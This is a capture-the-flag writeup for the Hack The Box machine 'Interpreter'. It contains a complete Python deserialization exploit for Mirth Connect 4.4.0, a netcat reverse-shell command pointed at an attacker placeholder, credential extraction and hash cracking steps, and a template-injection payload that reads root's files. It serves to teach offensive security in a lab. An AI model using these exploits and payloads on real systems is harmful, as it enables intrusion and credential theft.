# 🖥️ HTB Writeup: Interpreter

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Platform](https://img.shields.io/badge/Platform-Linux-blue)
![Status](https://img.shields.io/badge/Status-Rooted-success)
![Author](https://img.shields.io/badge/Author-Chad-orange)

---

## 🎯 Target Information

| Field | Value |
|--------|--------|
| IP Address | 10.129.3.174 |
| Hostname | interpreter.htb |
| OS | Linux |
| Author | Chad |

---

## ⚠️ Disclaimer

This writeup is for **educational purposes only** and reflects exploitation performed in an authorized Hack The Box lab environment.

---

# 📑 Table of Contents

1. [Enumeration](#-enumeration)
2. [Initial Exploitation – Mirth RCE](#-initial-exploitation--mirth-rce)
3. [Reverse Shell – mirth User](#-reverse-shell--mirth-user)
4. [Credential Discovery](#-credential-discovery)
5. [Password Cracking](#-password-cracking)
6. [User Flag](#-user-flag)
7. [Privilege Escalation – Root](#-privilege-escalation--root)
8. [Final Flags](#-final-flags)
9. [Lessons Learned](#-lessons-learned)

---

# 🔎 Enumeration

## Nmap Scan

```bash
nmap -sC -sV -Pn 10.129.3.174
```

### Open Ports Identified

| Port | Service | Version |
|------|---------|----------|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | Apache |
| 443 | HTTPS | Apache |

---

## Host Mapping

```bash
echo "10.129.3.174 interpreter.htb" | sudo tee -a /etc/hosts
```

Browsing the web application reveals **Mirth Connect**.

Checking the API endpoint:

```
https://interpreter.htb/api
```

Version identified:

```
4.4.0
```

---

# 💥 Initial Exploitation – Mirth RCE

Mirth Connect 4.4.0 is vulnerable to a Java deserialization RCE via its API endpoint.

I used a Python exploit to trigger remote command execution.

---

## 🧪 exploit.py

```python
#!/usr/bin/env python3
import argparse
import requests

requests.packages.urllib3.disable_warnings()

def xml_escape(s: str) -> str:
    return (s.replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&apos;'))

def build_payload(command: str) -> str:
    cmd = xml_escape(command)
    return f"""<sorted-set>
<string>abcd</string>
<dynamic-proxy>
<interface>java.lang.Comparable</interface>
<handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
<target class="org.apache.commons.collections4.functors.ChainedTransformer">
<iTransformers>
<org.apache.commons.collections4.functors.ConstantTransformer>
<iConstant class="java-class">java.lang.Runtime</iConstant>
</org.apache.commons.collections4.functors.ConstantTransformer>
<org.apache.commons.collections4.functors.InvokerTransformer>
<iMethodName>getMethod</iMethodName>
<iParamTypes>
<java-class>java.lang.String</java-class>
<java-class>[Ljava.lang.Class;</java-class>
</iParamTypes>
<iArgs>
<string>getRuntime</string>
<java-class-array/>
</iArgs>
</org.apache.commons.collections4.functors.InvokerTransformer>
<org.apache.commons.collections4.functors.InvokerTransformer>
<iMethodName>invoke</iMethodName>
<iParamTypes>
<java-class>java.lang.Object</java-class>
<java-class>[Ljava.lang.Object;</java-class>
</iParamTypes>
<iArgs>
<null/>
<object-array/>
</iArgs>
</org.apache.commons.collections4.functors.InvokerTransformer>
<org.apache.commons.collections4.functors.InvokerTransformer>
<iMethodName>exec</iMethodName>
<iParamTypes><java-class>java.lang.String</java-class></iParamTypes>
<iArgs><string>{cmd}</string></iArgs>
</org.apache.commons.collections4.functors.InvokerTransformer>
</iTransformers>
</target>
<methodName>transform</methodName>
<eventTypes><string>compareTo</string></eventTypes>
</handler>
</dynamic-proxy>
</sorted-set>"""

def main():
    p = argparse.ArgumentParser(description="Mirth API command execution PoC")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-c", "--command", required=True)
    args = p.parse_args()

    target = args.url.rstrip("/") + "/api/users"
    headers = {
        "X-Requested-With": "OpenAPI",
        "Content-Type": "application/xml"
    }

    xml = build_payload(args.command)
    r = requests.post(target, headers=headers, data=xml, verify=False, timeout=20)

    print(f"[+] HTTP {r.status_code}")
    print(r.text[:300])

if __name__ == "__main__":
    main()
```

---

## ✅ Validate RCE

```bash
python3 exploit.py -u https://interpreter.htb -c 'id'
```

Command execution confirmed.

---

# 🐚 Reverse Shell – mirth User

## Start Listener

```bash
nc -lvnp 4444
```

## Trigger Reverse Shell

```bash
python3 exploit.py -u https://interpreter.htb -c 'nc -c sh <ATTACKER_IP> 4444'
```

## Stabilize Shell

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Shell obtained as:

```
mirth@interpreter
```

---

# 🔐 Credential Discovery

Mirth configuration file:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

### Database Credentials Found

```
User: mirthdb
Pass: MirthPass123!
DB:   mc_bdd_prod
```

---

## Connect to Database

```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
```

---

## Extract Username and Hash

```sql
SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
FROM PERSON p
JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
```

Result:

```
sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

---

# 🔓 Password Cracking

## Decode Hash

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
```

### Split Salt and Key

- Salt (first 8 bytes)
- Remaining bytes = Key

Convert back to base64 and format as:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

---

## Crack with Hashcat

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
sedric:snowflake1
```

---

# 🚀 User Flag

```bash
ssh sedric@interpreter.htb
```

Password:

```
snowflake1
```

Retrieve flag:

```bash
cat /home/sedric/user.txt
```

```
3acab28a6dd180eb8338a3811c35d7ff
```

---

# 🔥 Privilege Escalation – Root

## Identify Local Service

```bash
ps aux | grep python
```

Found root-owned service:

```
/usr/local/bin/notif.py
```

Listening on:

```
127.0.0.1:54321
```

---

## Exploit Template Injection

```bash
xml='<patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'; printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321
```

Root flag returned in response.

---

# 🏁 Final Flags

| Access | Flag |
|--------|------|
| User | 3acab28a6dd180eb8338a3811c35d7ff |
| Root | d59de65d599fe370678a6c54dc59fabc |

---

# 🎓 Lessons Learned

- Java deserialization vulnerabilities remain highly critical.
- Internal services bound to localhost are exploitable post-compromise.
- Credential storage mechanisms matter — improper PBKDF2 implementation can lead to compromise.
- Template injection can escalate to full system compromise.

---

# 🧠 Attack Chain Summary

```
Mirth RCE → mirth shell → DB credentials → sedric SSH → Local template injection → root
```

---

**Machine successfully rooted.**
